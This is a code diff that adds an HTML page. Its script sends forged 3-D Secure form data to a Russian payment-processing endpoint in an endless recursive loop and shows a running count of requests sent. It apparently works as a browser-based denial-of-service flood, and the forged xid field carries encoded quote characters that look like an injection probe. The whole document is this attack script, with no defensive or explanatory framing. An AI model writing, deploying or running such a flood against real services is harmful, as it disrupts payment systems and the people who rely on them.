@@ -1,0 +1,24 @@
+<script>
+
+    function request(i = 0) {
+
+        fetch('https://ds1.mirconnect.ru/vbv/pareq', {
+            method: 'POST',
+            mode: 'no-cors',
+            referrerPolicy: 'no-referrer',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: 'version=3.0&merchantID=wildberries&xid=MTIzNDEyMzQzMjE0%27%22&mdStatus=7&mdErrorMsg=System+error+%28errid%3D321372363821%29&veresEnrolledStatus=-&paresTxStatus=-&iReqCode=&iReqDetail=&vendorCode=&eci=&cavv=&cavvAlgorithm=&MD=&PAResVerified=&PAResSyntaxOK=&lastEventGmtTime=2022-03-08+14%3A06%3A03.822&digest=&sID=&protocol='
+        })
+        .then((response) => {
+            document.getElementById('message').innerHTML = ++i;
+            request(i);
+        });
+
+    }
+
+    request();
+
+</script>
+<div id="message">0</div>
